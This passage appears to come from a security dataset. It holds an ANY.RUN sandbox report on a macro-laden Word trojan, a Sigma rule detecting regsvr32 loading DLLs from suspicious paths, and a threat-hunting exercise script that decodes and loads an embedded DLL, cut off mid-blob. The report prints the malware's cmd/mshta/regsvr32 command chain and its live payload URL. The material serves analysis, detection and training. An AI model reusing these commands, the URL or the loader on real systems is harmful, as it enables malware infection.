    "markdown": "# General Info\n\n| **File name:**     | **hola.doc**                                                                           |\n| ------------------ | -------------------------------------------------------------------------------------- |\n| **Full analysis:** | https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad                         |\n| **Verdict:**       | Malicious activity                                                                     |\n| **Threats:**       | Trojan                                                                                 |\n| **Analysis date:** | July 15, 2021 at 18:49:35                                                              |\n| **OS:**            | Windows 7 Professional Service Pack 1 (build: 7601, 32 bit)                            |\n| **Tags:**          | trojan                                                                                 |\n| **Indicators:**    | Multiprocessing, Network threats                                                       |\n| **MIME:**          | text/xml                                                                               |\n| **File info:**     | XML 1.0 document, UTF-8 Unicode text, with very long lines, with CRLF line terminators |\n| **MD5:**           | 843F6C0C24BFC31B6A19471935A092DA                                                       |\n| **SHA1:**          | 7B811D26A4852B9D564C4DAB878BD672BBBE7078                                               |\n| **SHA256:**        | CF0DE0C3FF0E337E47088E11C0867DDA9709EAAFA0A1C095C132E9B87722158E                       |\n| **SSDEEP:**        | 1536:EVHB5EfbL5A3S9Hr11AQYyqGJHQYCDEtU6dLTR97iQ3:AUfbL5iSDxQYNtU6Zvi4                  |\n\n> ANY.RUN is an interactive service which provides full access to the guest system. Information in this report could be distorted by user actions and is provided for user acknowledgement as it is. ANY.RUN does not guarantee maliciousness or safety of the content.\n\n## Behavior Activities\n\n### MALICIOUS\n\n- **Unusual execution from Microsoft Office**\n  - WINWORD.EXE (PID: 2060)\n- **Starts CMD.EXE for commands execution**\n  - WINWORD.EXE (PID: 2060)\n- **Registers / Runs the DLL via REGSVR32.EXE**\n  - mshta.exe (PID: 3068)\n  - mshta.exe (PID: 2408)\n\n### SUSPICIOUS\n\n- **Checks supported languages**\n  - cmd.exe (PID: 1568)\n  - mshta.exe (PID: 2408)\n  - cmd.exe (PID: 2424)\n  - mshta.exe (PID: 3068)\n- **Reads the computer name**\n  - mshta.exe (PID: 2408)\n  - cmd.exe (PID: 1568)\n  - mshta.exe (PID: 3068)\n  - cmd.exe (PID: 2424)\n- **Creates files in the program directory**\n  - WINWORD.EXE (PID: 2060)\n- **Starts Microsoft Office Application**\n  - MSOXMLED.EXE (PID: 3600)\n- **Starts MSHTA.EXE for opening HTA or HTMLS files**\n  - cmd.exe (PID: 1568)\n  - cmd.exe (PID: 2424)\n- **Reads Microsoft Outlook installation path**\n  - mshta.exe (PID: 2408)\n  - mshta.exe (PID: 3068)\n\n### INFO\n\n- **Checks supported languages**\n  - MSOXMLED.EXE (PID: 3600)\n  - WINWORD.EXE (PID: 2060)\n  - regsvr32.exe (PID: 2708)\n  - regsvr32.exe (PID: 3888)\n- **Reads the computer name**\n  - WINWORD.EXE (PID: 2060)\n  - MSOXMLED.EXE (PID: 3600)\n- **Creates files in the user directory**\n  - WINWORD.EXE (PID: 2060)\n- **Reads Microsoft Office registry keys**\n  - WINWORD.EXE (PID: 2060)\n  - MSOXMLED.EXE (PID: 3600)\n- **Reads internet explorer settings**\n  - mshta.exe (PID: 2408)\n  - mshta.exe (PID: 3068)\n- **Searches for installed software**\n  - WINWORD.EXE (PID: 2060)\n\n> Find more information about signature artifacts and mapping to MITRE ATT&CK™ MATRIX at the full report.\n\n## Malware Configuration\n\nNo Malware configuration.\n\n## Static Information\n\n### TRiD\n- **.xml** | Microsoft Office XML Flat File Format Word Document (ASCII) (65.1)\n- **.xml** | Microsoft Office XML Flat File Format (ASCII) (31)\n- **.xml** | Generic XML (ASCII) (2.3)\n- **.html** | HyperText Markup Language (1.4)\n\n### EXIF\n\n- **WordDocumentMacrosPresent:** yes\n- **WordDocumentEmbeddedObjPresent:** no\n- **WordDocumentOcxPresent:** no\n- **WordDocumentIgnoreSubtreeVal:** http://schemas.microsoft.com/office/word/2003/wordml/sp2\n- **WordDocumentDocumentPropertiesAuthor:** admin\n- **WordDocumentDocumentPropertiesLastAuthor:** Пользователь Windows\n- **WordDocumentDocumentPropertiesRevision:** 2\n- **WordDocumentDocumentPropertiesCreated:** 2021:07:15 10:45:00Z\n- **WordDocumentDocumentPropertiesLastSaved:** 2021:07:15 10:45:00Z\n- **WordDocumentDocumentPropertiesPages:** 2\n- **WordDocumentDocumentPropertiesWords:** 150\n- **WordDocumentDocumentPropertiesCharacters:** 3199\n- **WordDocumentDocumentPropertiesBytes:** 21414\n- **WordDocumentDocumentPropertiesLines:** 79\n- **WordDocumentDocumentPropertiesParagraphs:** 77\n- **WordDocumentDocumentPropertiesCharactersWithSpaces:** 3272\n- **WordDocumentDocumentPropertiesVersion:** 16\n- **WordDocumentFontsDefaultFontsAscii:** Calibri\n- **WordDocumentFontsDefaultFontsFareast:** Calibri\n- **WordDocumentFontsDefaultFontsH-ansi:** Calibri\n- **WordDocumentFontsDefaultFontsCs:** Times New Roman\n- **WordDocumentFontsFontName:** Times New Roman\n- **WordDocumentFontsFontPanose-1Val:** 02020603050405020304\n- **WordDocumentFontsFontCharsetVal:** CC\n- **WordDocumentFontsFontFamilyVal:** Roman\n- **WordDocumentFontsFontPitchVal:** variable\n- **WordDocumentFontsFontSigUsb-0:** E0002EFF\n- **WordDocumentFontsFontSigUsb-1:** C000785B\n- **WordDocumentFontsFontSigUsb-2:** 00000009\n- **WordDocumentFontsFontSigUsb-3:** 00000000\n- **WordDocumentFontsFontSigCsb-0:** 000001FF\n- **WordDocumentFontsFontSigCsb-1:** 00000000\n- **WordDocumentStylesVersionOfBuiltInStylenamesVal:** 7\n- **WordDocumentStylesLatentStylesDefLockedState:** off\n- **WordDocumentStylesLatentStylesLatentStyleCount:** 371\n- **WordDocumentStylesLatentStylesLsdExceptionName:** Normal\n- **WordDocumentStylesStyleType:** paragraph\n- **WordDocumentStylesStyleDefault:** on\n- **WordDocumentStylesStyleStyleId:** Normal\n- **WordDocumentStylesStyleNameVal:** Normal\n- **WordDocumentStylesStyleRsidVal:** 00C52374\n- **WordDocumentStylesStylePPrSpacingAfter:** 160\n- **WordDocumentStylesStylePPrSpacingLine:** 259\n- **WordDocumentStylesStylePPrSpacingLine-rule:** auto\n- **WordDocumentStylesStyleRPrFontVal:** Calibri\n- **WordDocumentStylesStyleRPrSzVal:** 22\n- **WordDocumentStylesStyleRPrSz-csVal:** 22\n- **WordDocumentStylesStyleRPrLangVal:** RU\n- **WordDocumentStylesStyleRPrLangFareast:** EN-US\n- **WordDocumentStylesStyleRPrLangBidi:** AR-SA\n- **WordDocumentStylesStyleUiNameVal:** Table Normal\n- **WordDocumentStylesStyleTblPrTblIndW:** -\n- **WordDocumentStylesStyleTblPrTblIndType:** dxa\n- **WordDocumentStylesStyleTblPrTblCellMarTopW:** -\n- **WordDocumentStylesStyleTblPrTblCellMarTopType:** dxa\n- **WordDocumentStylesStyleTblPrTblCellMarLeftW:** 108\n- **WordDocumentStylesStyleTblPrTblCellMarLeftType:** dxa\n- **WordDocumentStylesStyleTblPrTblCellMarBottomW:** -\n- **WordDocumentStylesStyleTblPrTblCellMarBottomType:** dxa\n- **WordDocumentStylesStyleTblPrTblCellMarRightW:** 108\n- **WordDocumentStylesStyleTblPrTblCellMarRightType:** dxa\n- **WordDocumentDocSuppDataBinDataName:** editdata.mso\n- **WordDocumentDocSuppDataBinData:** QWN0aXZlTWltZQAAAfAEAAAA/////wAAB/BnEgAABAAAAAQAAAAAAAAAAgAAAAA8AAB4nO1bDXBT...\n\n## Video and Screenshots\n\n```image\nAlt: screenshot\nDescription: The image depicts a screenshot of a Microsoft Word document opened in compatibility mode. It displays a message indicating that the document was created in a previous version of Microsoft Office Word. The user is instructed to click the 'Enable editing' button on the top bar and then click 'Enable content' to view or edit the document. The interface shows standard Word toolbar options and includes a document title 'hola.doc.xml' with an indication of character count at the bottom.\n```\n\n```image\nAlt: screenshot\nDescription: The image shows a screenshot of an error message from Microsoft Office Word. The message indicates that a module located at 'c:\\users\\public\\boxDelInd.jpg' may not be compatible with the version of Windows being used. The error is presented in a pop-up window titled 'Regsvr32', with a red error icon. The background displays an open document in Word, along with the application interface.\n```\n\n```image\nAlt: screenshot\nDescription: The image is a screenshot of a Microsoft Word document opened in Compatibility Mode. It displays a message indicating that the document was created in a previous version of Microsoft Office Word. The message prompts the user to enable editing and content to interact with the document. The layout features the Word logo, a toolbar at the top, and the document text clearly visible. This type of image is useful for illustrating compatibility issues or instructions for users in a cybersecurity context.\n```\n\n```image\nAlt: screenshot\nDescription: The image is a screenshot of a Microsoft Word document displaying a message that indicates the document was created in a previous version of Microsoft Office Word. It contains instructions for the user to enable editing by clicking the 'Enable editing' button on the top bar and then clicking 'Enable content.' The interface shows a compatibility warning and features the Word logo prominently.\n```\n\n```image\nAlt: screenshot\nDescription: The image displays a screenshot of a Microsoft Word document that indicates it was created in a previous version of Office. It includes a message prompting the user to enable editing to view or edit the document. The interface shows the File menu, indicating compatibility mode, and features the Word logo prominently.\n```\n\n```image\nAlt: screenshot\nDescription: The image depicts a screenshot of a Microsoft Word document opened in compatibility mode. The document indicates that it was created in a previous version of Microsoft Office Word, with a prompt instructing users to enable editing for full access. The interface shows the Word logo and various menu options typical of the software, suggesting that this image is part of a technical analysis related to document handling or potentially malware that exploits Word documents.\n```\n\n```image\nAlt: screenshot\nDescription: The image shows a screenshot of a Microsoft Word document indicating that it was created in a previous version of Word. It features a message prompting the user to enable editing to view or edit the document, along with a logo of Microsoft Word. The interface also displays the 'File' menu and several options related to macros, suggesting that the document might involve some form of scripting or automation, which can be relevant in a cyber threat context.\n```\n\n```image\nAlt: screenshot\nDescription: The image depicts a screenshot from Microsoft Word in compatibility mode. It shows a dialog box titled 'Macros', which lists a macro named 'document_open' alongside an option to run, edit, or delete it. The interface indicates that this is part of a tutorial or guide related to using macros in Microsoft Word. The context suggests this screenshot is relevant to understanding potential security issues related to macro usage in documents.\n```\n\n```image\nAlt: screenshot\nDescription: The image is a screenshot of a Microsoft Word document interface. It displays a message indicating that the document was created in a previous version of Microsoft Office Word. To edit the document, the user is instructed to click the 'Enable editing' button on the top bar. The interface shows a typical Microsoft Word layout, including menus for 'File', 'Insert', 'Page Layout', etc., along with a document area that is mostly blank.\n```\n\n> All screenshots are available in the full report.\n\n## Processes\n\n- **Total processes:** 45\n- **Monitored processes:** 8\n- **Malicious processes:** 1\n- **Suspicious processes:** 2\n\n### Behavior Graph\n\n```image\nAlt: Behavior Graph\nDescription: The image is a behavior graph illustrating the process flow of certain executable files in a cybersecurity context. It starts with 'msxmlled.exe' and shows its connection to 'winword.exe'. From 'winword.exe', it branches out to 'cmd.exe', leading to 'mshta.exe', which further connects to 'regsvr32.exe'. Each process is represented with corresponding icons, and there are indicators for no specific details available for each executable. The diagram visually conveys the relationships and sequences among the processes involved.\nTranscription: |\n  start\n     |\n     v\n  msoxmled.exe\n    no specs\n     |\n     v\n  winword.exe\n    no specs\n     |\n     v\n    cmd.exe\n    no specs\n     |\n     v\n   mshta.exe\n     |\n     v\n  regsvr32.exe\n    no specs\n```\n\n> Click at the process to see the details.\n\n### Process Information\n\n| **PID**  | **CMD**                                                                                                                            | **Path**                                                             | **Indicators** | **Parent process** |\n| -------- | ---------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------- | -------------- | ------------------ |\n| **3600** | \"C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE14\\MSOXMLED.EXE\" /verb open \"C:\\Users\\admin\\AppData\\Local\\Temp\\hola.doc.xml\" | C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE14\\MSOXMLED.EXE | —              | Explorer.EXE       |\n| **2060** | \"C:\\Program Files\\Microsoft Office\\Office14\\WINWORD.EXE\" /n \"C:\\Users\\admin\\AppData\\Local\\Temp\\hola.doc.xml\"                       | C:\\Program Files\\Microsoft Office\\Office14\\WINWORD.EXE               | —              | MSOXMLED.EXE       |\n| **1568** | cmd /c c:\\programdata\\boxDelInd.hta                                                                                                | C:\\Windows\\system32\\cmd.exe                                          | —              | WINWORD.EXE        |\n| **2408** | \"C:\\Windows\\System32\\mshta.exe\" \"C:\\programdata\\boxDelInd.hta\"                                                                     | C:\\Windows\\System32\\mshta.exe                                        | Network        | cmd.exe            |\n| **3888** | \"C:\\Windows\\System32\\regsvr32.exe\" c:\\users\\public\\boxDelInd.jpg                                                                   | C:\\Windows\\System32\\regsvr32.exe                                     | —              | mshta.exe          |\n| **2424** | cmd /c c:\\programdata\\boxDelInd.hta                                                                                                | C:\\Windows\\system32\\cmd.exe                                          | —              | WINWORD.EXE        |\n| **3068** | \"C:\\Windows\\System32\\mshta.exe\" \"C:\\programdata\\boxDelInd.hta\"                                                                     | C:\\Windows\\System32\\mshta.exe                                        | Network        | cmd.exe            |\n| **2708** | \"C:\\Windows\\System32\\regsvr32.exe\" c:\\users\\public\\boxDelInd.jpg                                                                   | C:\\Windows\\System32\\regsvr32.exe                                     | —              | mshta.exe          |\n\n## Registry Activity\n\n- **Total events:** 5,997\n- **Read events:** 5,153\n- **Write events:** 670\n- **Delete events:** 174\n\n### Modification Events\n\n| **Process**             | **Key**                                                                                                                                  | **Operation** | **Name**    | **Value**                                |\n| ----------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- | ------------- | ----------- | ---------------------------------------- |\n| **(3600) MSOXMLED.EXE** | HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\5.0\\Cache\\Content                                          | write         | CachePrefix | —                                        |\n| **(3600) MSOXMLED.EXE** | HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\5.0\\Cache\\Cookies                                          | write         | CachePrefix | Cookie                                   |\n| **(3600) MSOXMLED.EXE** | HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\5.0\\Cache\\History                                          | write         | CachePrefix | Visited                                  |\n| **(3600) MSOXMLED.EXE** | HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\UserData\\S-1-5-18\\Products\\00004109D30000000000000000F01FEC\\Usage | write         | WORDFiles   | —                                        |\n| **(2060) WINWORD.EXE**  | HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\14.0\\Word\\Resiliency\\StartupItems                                                            | write         | l$?         | 6C243F000C080000010000000000000000000000 |\n| **(2060) WINWORD.EXE**  | HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\14.0\\Common\\LanguageResources\\EnabledLanguages                                               | write         | 1033        | Off                                      |\n| **(2060) WINWORD.EXE**  | HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\14.0\\Common\\LanguageResources\\EnabledLanguages                                               | write         | 1041        | Off                                      |\n| **(2060) WINWORD.EXE**  | HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\14.0\\Common\\LanguageResources\\EnabledLanguages                                               | write         | 1046        | Off                                      |\n| **(2060) WINWORD.EXE**  | HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\14.0\\Common\\LanguageResources\\EnabledLanguages                                               | write         | 1036        | Off                                      |\n| **(2060) WINWORD.EXE**  | HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\14.0\\Common\\LanguageResources\\EnabledLanguages                                               | write         | 1031        | Off                                      |\n\n## Files Activity\n\n- **Executable files:** 0\n- **Suspicious files:** 0\n- **Text files:** 6\n- **Unknown types:** 2\n\n### Dropped Files\n\n| **PID**  | **Process** | **Filename**                                                                                               | **Type** |\n| -------- | ----------- | ---------------------------------------------------------------------------------------------------------- | -------- |\n| **2060** | WINWORD.EXE | C:\\Users\\admin\\AppData\\Local\\Temp\\CVRDCCC.tmp.cvr                                                          | —        |\n| **2408** | mshta.exe   | C:\\Users\\admin\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\78RFYB7Z\\rymes2[1].htm | html     |\n| **2060** | WINWORD.EXE | C:\\Users\\admin\\AppData\\Roaming\\Microsoft\\Templates\\~$Normal.dotm                                           | pgc      |\n| **2060** | WINWORD.EXE | C:\\programdata\\boxDelInd.hta                                                                               | html     |\n| **3068** | mshta.exe   | C:\\Users\\admin\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\B6QGX7LP\\rymes2[1].htm | html     |\n| **2408** | mshta.exe   | C:\\users\\public\\boxDelInd.jpg                                                                              | html     |\n| **2060** | WINWORD.EXE | C:\\Users\\admin\\AppData\\Local\\Temp\\~$la.doc.xml                                                             | pgc      |\n| **2060** | WINWORD.EXE | C:\\Users\\admin\\AppData\\Roaming\\Microsoft\\UProof\\ExcludeDictionaryRU0419.lex                                | text     |\n| **2060** | WINWORD.EXE | C:\\Users\\admin\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.MSO\\BFC4F95E.png           | image    |\n\n> Download PCAP, analyze network streams, HTTP content and a lot more at the full report.\n\n## Network Activity\n\n- **HTTP(S) requests:** 2\n- **TCP/UDP connections:** 2\n- **DNS requests:** 1\n- **Threats:** 2\n\n### HTTP Requests\n\n| **PID**  | **Process** | **Method** | **HTTP Code** | **IP**            | **URL**                                                                                                                                                                                                                                                                                                                                                                                                                                                                | **CN**  | **Type** | **Size** | **Reputation** |\n| -------- | ----------- | ---------- | ------------- | ----------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------- | -------- | -------- | -------------- |\n| **2408** | mshta.exe   | GET        | 200           | 45.153.230.151:80 | http://airloweryd.com/adda/VbJkW1EuzDNQrIxQDvH/IDcQzbYyMGhWy06DDsSHeUAK3GHQkEbCL8w9/E1xx4lOEKH7E8cHocpfeqr0ZLSG0IPv9dSbLJ7VFg9tdg42g/k81pzGewugMThHD6HmhhV3/I9gjfu3RhqvK0Lzw9TIkWDWI5kGNNPWaOt9Vl6iE64QsjeM/Tx8tV7HlFYHyY5KNaUVj5pPO74xv3RG7he/Ba3uo8Ybu6HFexi9spmowa0zgOOp1OS9E6MvubDFn01/66956/4157/rymes2?sid=Qj9QvQEkA9&ref=4USoX5E3EMI&qatj0z=s03jN&DEz=lSAm&ref=3iiqNuFGEWNDfm0JE08XtyxLNf3&sid=2xPqjWeQeOwhE7hrUkCyPp6lM&ref=Bz&D5Zq=l44bPLuTuHocNX0&user=1pMhG | unknown | html     | 205 b    | malicious      |\n| **3068** | mshta.exe   | GET        | 200           | 45.153.230.151:80 | http://airloweryd.com/adda/VbJkW1EuzDNQrIxQDvH/IDcQzbYyMGhWy06DDsSHeUAK3GHQkEbCL8w9/E1xx4lOEKH7E8cHocpfeqr0ZLSG0IPv9dSbLJ7VFg9tdg42g/k81pzGewugMThHD6HmhhV3/I9gjfu3RhqvK0Lzw9TIkWDWI5kGNNPWaOt9Vl6iE64QsjeM/Tx8tV7HlFYHyY5KNaUVj5pPO74xv3RG7he/Ba3uo8Ybu6HFexi9spmowa0zgOOp1OS9E6MvubDFn01/66956/4157/rymes2?sid=Qj9QvQEkA9&ref=4USoX5E3EMI&qatj0z=s03jN&DEz=lSAm&ref=3iiqNuFGEWNDfm0JE08XtyxLNf3&sid=2xPqjWeQeOwhE7hrUkCyPp6lM&ref=Bz&D5Zq=l44bPLuTuHocNX0&user=1pMhG | unknown | html     | 205 b    | malicious      |\n\n### Connections\n\n| **PID**  | **Process** | **IP**            | **Domain**     | **ASN** | **CN** | **Reputation** |\n| -------- | ----------- | ----------------- | -------------- | ------- | ------ | -------------- |\n| **2408** | mshta.exe   | 45.153.230.151:80 | airloweryd.com | —       | —      | malicious      |\n| **3068** | mshta.exe   | 45.153.230.151:80 | airloweryd.com | —       | —      | malicious      |\n\n### DNS Requests\n\n| **Domain**         | **IP**         | **Reputation** |\n| ------------------ | -------------- | -------------- |\n| **airloweryd.com** | 45.153.230.151 | malicious      |\n\n> 2 ETPRO signatures available at the full report.\n\n## Debug Output Strings\n\nNo debug info.",
    "sigma_rule": {
      "title": "Regsvr32 Execution From Potential Suspicious Location",
      "id": "9525dc73-0327-438c-8c04-13c0e037e9da",
      "related": [
        {
          "id": "8e2b24c9-4add-46a0-b4bb-0057b4e6187d",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects execution of regsvr32 where the DLL is located in a potentially suspicious location.",
      "references": [
        "https://web.archive.org/web/20171001085340/https://subt0x10.blogspot.com/2017/04/bypass-application-whitelisting-script.html",
        "https://any.run/report/cf0de0c3ff0e337e47088e11c0867dda9709eaafa0a1c095c132e9b87722158e/34221348-072d-4b70-93f3-aa71f6ebecad/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-26",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.010"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\regsvr32.exe"
          },
          {
            "OriginalFileName": "REGSVR32.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            ":\\ProgramData\\",
            ":\\Temp\\",
            ":\\Users\\Public\\",
            ":\\Windows\\Temp\\",
            "\\AppData\\Local\\Temp\\",
            "\\AppData\\Roaming\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Some installers might execute \"regsvr32\" with DLLs located in %TEMP% or in %PROGRAMDATA%. Apply additional filters if necessary."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_regsvr32_susp_exec_path_1.yml"
  },
  "16": {
    "url": "https://web.archive.org/web/20221026202428/https://gist.github.com/code-scrap/d7f152ffcdb3e0b02f7f394f5187f008",
    "markdown": "# code-scrap / README.md\n\nTable Top With Teeth - Training Exercise\n\n## README.md\n\n### Instructions\n\nThe following script is designed to create artifacts that teams can use to hunt, new or interesting capabilities.\n\nThe following table top is based on the code here: https://github.com/code-scrap/DynamicWrapperDotNet\n\nThis script is self-contained. It should dynamically write a DLL to disk and load it into `cscript.exe`.\n\nTo Invoke:\n```\ncscript.exe stranger_things.js\n```\nThis example expects a 64bit system. You can modify that if you want ARM or x86 etc.\n\n### Ideas of what to hunt/test:\n1. Did the anti-malware engine detect a malicious script?\n2. Did you observe the DLL written to disk?\n3. Did you observe the DLL/Module Load?\n4. What artifacts does this approach leave behind?\n5. How might an attacker change this script to evade detection? hint: that 'base64 blob lol'\n\n## stranger_things.js\n\n```\nvar scriptdir = WScript.ScriptFullName.substring(0,WScript.ScriptFullName.lastIndexOf(WScript.ScriptName)-1)\nnew ActiveXObject('WScript.Shell').Environment('Process')('TMP') = scriptdir;\n\n\n// Create Base64 Object, supports encode, decode \nvar Base64={characters:\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\",encode:function(a){Base64.characters;var r=\"\",c=0;do{var e=a.charCodeAt(c++),t=a.charCodeAt(c++),h=a.charCodeAt(c++),s=(e=e||0)>>2&63,A=(3&e)<<4|(t=t||0)>>4&15,o=(15&t)<<2|(h=h||0)>>6&3,B=63&h;t?h||(B=64):o=B=64,r+=Base64.characters.charAt(s)+Base64.characters.charAt(A)+Base64.characters.charAt(o)+Base64.characters.charAt(B)}while(c<a.length);return r}};\n//Magic is just a cool way to decode to byte array ;\nfunction Magic(r){if(!/^[a-z0-9+/]+={0,2}$/i.test(r)||r.length%4!=0)throw Error(\"Not base64 string\");for(var t,e,n,o,i,a,f=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\",h=[],d=0;d<r.length;d+=4)t=(a=f.indexOf(r.charAt(d))<<18|f.indexOf(r.charAt(d+1))<<12|(o=f.indexOf(r.charAt(d+2)))<<6|(i=f.indexOf(r.charAt(d+3))))>>>16&255,e=a>>>8&255,n=255&a,h[d/4]=String.fromCharCode(t,e,n),64==i&&(h[d/4]=String.fromCharCode(t,e)),64==o&&(h[d/4]=String.fromCharCode(t));return r=h.join(\"\")}\nfunction binaryWriter(res,filename)\n{var base64decoded=Magic(res);var TextStream=new ActiveXObject('ADODB.Stream');TextStream.Type=2;TextStream.charSet='iso-8859-1';TextStream.Open();TextStream.WriteText(base64decoded);var BinaryStream=new ActiveXObject('ADODB.Stream');BinaryStream.Type=1;BinaryStream.Open();TextStream.Position=0;TextStream.CopyTo(BinaryStream);BinaryStream.SaveToFile(filename,2);BinaryStream.Close()}\n// x64 dynwrapx.dll v 2.2.0 http://dynwrapx.script-coding.com/dwx/pages/dynwrapx.php?lang=en\nvar dynwrapX = 'T' +'V'+ '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